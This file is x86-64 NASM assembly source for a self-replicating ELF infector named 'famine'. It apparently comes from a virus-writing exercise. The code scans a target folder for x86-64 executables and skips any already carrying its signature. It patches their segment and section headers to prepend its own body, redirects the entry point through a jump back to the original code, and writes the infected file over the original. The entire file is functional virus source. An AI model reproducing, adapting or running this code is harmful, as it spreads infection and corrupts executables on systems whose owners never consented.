%include "header.asm"
[BITS 64]
default rel

section .text
    global _famine

_famine:
    PUSH
    mov rbp, rsp
    sub rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE

open_dir:
    lea rdi, [rel hook.folder_1]
    mov rsi, 0                                          ; read only
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0                                          ; open fail
    jl clean    

    mov rdi, rax
    mov rax, SYS_GETDENTS
    mov rsi, rsp
    add rsi, 256                                        ; offset struct dirent
    mov rdx, DIRENT
    syscall
    mov r13, rax
    mov rax, SYS_CLOSE
    syscall

find_file:
    cmp rbx, r13
    jge clean
    lea rsi, [rsp + 256]                                ; struct dirent
    add rsi, rbx                                        ; current offset
    add rsi, LDIRENT_64.d_type
    cmp byte [rsi], 0x8                                 ; DT_REG
    jne next_file

    lea  rdi, [rsp + 256 + rbx + LDIRENT_64.d_name]

target_file:
    mov rax, rdi
    lea rdi, [rsp]
    lea rsi, [rel hook.folder_1]
    .path_dir:                  ; concat path
        movsb
        cmp byte [rsi], 0
        jne .path_dir
    mov rsi, rax
    .append_file:
        movsb
        cmp byte [rsi], 0
        jne .append_file

validate_target:
    lea rdi, [rsp]                                          ; filename
    mov rax, SYS_OPEN
    mov rsi, 0x0                                            ; O_RDONLY
    syscall
    cmp rax, 0
    jle next_file
    mov rdi, rax
    mov r15, rax
    mov rsi, rsp
    add rsi, FILE_SIZE + DIRENT
    mov rax, SYS_FSTAT
    syscall
    cmp rax, 0
    jne next_file

map_target:
    mov rdi, 0x0
    mov rsi, QWORD [rsp + FILE_SIZE + DIRENT + 48]      ; filesz
    mov rdx, 0x3                                            ; READ | WRITE
    mov r10, 0x0002                                         ; MAP_PRIVATE
    mov r8, r15                                             ; fd
    mov r9, 0                                               ; offset
    mov rax, 9                                              ; SYS_MMAP
    syscall
    mov [rbp - 16], rax                                     ; store mapped file

elf_header:
    mov rsi, [rbp - 16]
    cmp dword [rsi], 0x464c457f                             ; 7fELF
    jne clear
    .exec:
        cmp word [rsi + Elf64_Ehdr.e_type], ET_EXEC         ; ET_EXEC
        jne clear
    .machine:
        cmp word [rsi + Elf64_Ehdr.e_machine], 62           ; x86_64
        je elf_sign
    jmp clear

; check if already infected
elf_sign:
    add rsi, FAMINE_SIZE + 12 + 20 + 64                           ; offset signature
    lea rdi, [rel hook.SIGN]
    mov rcx, 38
    cld
    repe cmpsb
    je clear
; rsi = e_hdr
elf_phdr:
    mov rdx, [rbp - 16]
    add rdx, [rdx + Elf64_Ehdr.e_phoff]
    ;rdx = phdr
    PAGE_ALIGN FAMINE_SIZE
    add [rdx + phdr64.p_offset], rcx                        ; phdr[0]
    add [rdx + phdr64.p_offset + 0x38], rcx                 ; phdr[1]

;rdx = phdr[0]
patch_segtext:
    mov rsi, rcx
    mov rax, [rbp - 16]
    mov rcx, [rax + Elf64_Ehdr.e_entry]
    mov [rbp - 30], rcx                                     ; save entry point
    xor rcx, rcx
    mov cx, word [rax + Elf64_Ehdr.e_phnum]                 ; n phdr
    xor rax, rax
    .loop:
        cmp cx, 0
        je patch_hdr
        sub cx, 1
    .found:                                                 ; if text found
        cmp al, 1
        jne .compare
        add [rdx + phdr64.p_offset], rsi
    .compare:
        cmp dword [rdx + phdr64.p_type], PT_LOAD
        jne .keep
        cmp dword [rdx + phdr64.p_flags], 0x5               ; R | X
        jne .keep
        sub [rdx + phdr64.p_vaddr], rsi
        mov rdi, [rbp - 16]
        mov r8, [rdx + phdr64.p_vaddr]
        mov [rdi + Elf64_Ehdr.e_entry], r8
        sub [rdx + phdr64.p_paddr], rsi
        add [rdx + phdr64.p_filesz], rsi
        add [rdx + phdr64.p_memsz], rsi
        mov al, 1
    .keep:
        add rdx, 0x38                                       ; next phdr
        jmp .loop

patch_hdr:
    test al, al                                             ; no text found
    je clear
    add qword [rdi + Elf64_Ehdr.e_entry], 0x40              ; new entry  + sizeof(elf_hdr)

patch_shdr:
    mov rax, [rbp - 16]                                     ;EHDR
    mov cx, word [rax + Elf64_Ehdr.e_shnum]                 ;n sections
    add rax, [rax + Elf64_Ehdr.e_shoff]                     ;sections[0]
    .loop:
        cmp cx, 0
        je .ehdr
        sub cx, 1
        add qword [rax + shdr64.sh_offset], rsi
        add rax, 0x40
        jmp .loop
    .ehdr:
        mov rax, [rbp - 16]
        add [rax + Elf64_Ehdr.e_shoff], rsi
        add [rax + Elf64_Ehdr.e_phoff], rsi

mimic:
    lea rdi, [rel hook.TMP]
    mov rsi, 577                                                   ; O_CREAT | O_WRONLY | O_TRUNC
    mov rdx, [rsp + FILE_SIZE + DIRENT + MAPPED_FILE + 16]         ; st_mode
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0
    jl clear
    mov r8, rax
;write header
    write r8, [rbp - 16], 64                                        ; maybe change
;write viruses
    write_rel r8, [rel _famine], FAMINE_SIZE
;write opcode to jump to actualy entry
    mov [rbp - 32], word 0xb848                                     ; mov rax
    mov [rbp - 22], word 0xe0ff                                     ; jmp rax
;write vars
    write_rel r8, [rbp - 32], 0xc
    write_rel r8, [rel hook.folder_1], 58
;write padding
    PAGE_ALIGN FAMINE_SIZE
    sub rcx, FAMINE_SIZE
    sub rcx, 70                                                     ; jmp entry + vars
    mov r9, rcx
    .loop:
        cmp r9, 0
        je .keep
        mov rdi, r8
        lea rsi, [rel hook.null]
        mov rdx, 1
        mov rax, SYS_WRITE
        syscall
        sub r9, 1
        jmp .loop
; write rest of file
    .keep:
        mov rdi, r8
        mov rax, [rbp - 16]
        add rax, 0x40
        mov rsi, rax
        mov rdx, [rsp + FILE_SIZE + DIRENT + 48]
        sub rdx, 0x40
        mov rax, SYS_WRITE
        syscall

rename:
    lea rdi, [rel hook.TMP]
    lea rsi, [rsp]
    mov rax, SYS_RENAME
    syscall

clear:
    mov rdi, [rbp - 16]
    mov rsi, [rsp + FILE_SIZE + DIRENT + 48]
    mov rax, SYS_MUNMAP                           
    syscall
    mov rdi, r8
    mov rax, SYS_CLOSE
    syscall                                                 

next_file:
    mov rcx, FILE_SIZE
    memset [rsp], rcx                                       ; FILESIZE memset
    movzx r9, word [rsp + 256 + rbx + LDIRENT_64.d_reclen]  ; offset dirent + offset + d_reclen
    add rbx, r9
    jmp find_file

clean:
    add rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
    mov rsp, rbp
    POP

_v_stop:                                                   ; End of famine
    mov rax, SYS_EXIT 
    mov rdi, 0
    syscall

hook:
    .folder_1:
        db FOLDER_1, 0
    .TMP:
        db TMP, 0
    .SIGN:
        db SIGNATURE, 0
    .null:
        db 0
